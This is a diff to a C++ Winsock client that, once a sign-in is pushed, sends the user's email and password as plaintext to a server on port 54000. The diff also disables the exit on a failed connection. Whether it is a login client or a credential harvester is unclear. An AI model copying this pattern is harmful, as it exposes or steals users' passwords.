@@ -5,7 +5,8 @@
     int port = 54000;						// Listening port # on the server
     char buf[4096];
 
-    string oof;
+    string EmailSend;
+    string PasswordSend;
     size_t* sz;
 
 
@@ -27,12 +28,15 @@
 
         
         int connResult = connect(sock, (sockaddr*)&hint, sizeof(hint));
+
+        /*
         if (connResult == SOCKET_ERROR)
         {        
             closesocket(sock);
             WSACleanup();
             ExitProcess(EXIT_FAILURE);
         }
+        */
 
 
         while(1)
@@ -40,13 +44,15 @@
 
             if (pPushedSignIn)	
             {
-
-                // Send the text
                 setlocale(LC_CTYPE, "");
 
-                string s(EmailStr.begin(), EmailStr.end());
+                EmailSend = string(EmailStr.begin(), EmailStr.end());
+                PasswordSend = string(PasswordStr.begin(), PasswordStr.end());
 
-                int sendResult = send(sock,s.c_str(), s.size() , 0);
+                int sendResult = send(sock,EmailSend.c_str(), EmailSend.size() , 0);
+                int sendResult2 = send(sock, PasswordSend.c_str(), PasswordSend.size(), 0);
+
+
                 if (sendResult != SOCKET_ERROR)
                 {
                     // Wait for response
@@ -59,6 +65,7 @@
                     }
                 }
             }
+
             Sleep(10);
         } 
 
